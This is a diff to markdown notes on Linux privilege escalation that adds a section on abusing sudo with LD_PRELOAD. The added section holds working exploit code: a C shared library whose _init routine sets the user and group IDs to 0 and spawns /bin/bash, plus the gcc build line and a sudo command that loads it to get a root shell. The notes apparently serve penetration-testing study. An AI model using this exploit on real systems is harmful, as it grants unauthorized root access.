@@ -130,6 +130,31 @@ LD_PRELOAD=$PWD/unrandom.so ./random_nums
 ```
 Our program failed to generate random numbers, because it did not use the “real” rand(), but the one we provided – which returns 42 every time.
 
+Using `sudo` privilege on `LD_PRELOAD` to gain root access
+
+`vim shell.c`
+```
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init() {
+unsetenv("LD_PRELOAD");
+setgid(0);
+setuid(0);
+system("/bin/bash");
+}
+```
+
+```
+gcc -fPIC -shared -o shell.so shell.c -nostartfiles
+```
+
+```
+sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
+#assume we have sudo on find. i know sudo on find only can be leverage to gain root access. But this is for demo purpose.
+```
+
 #### Abusing `sudo` permission on `nano`
 The following is extrected from [GTFO bins](https://gtfobins.github.io/gtfobins/nano/)
 ```
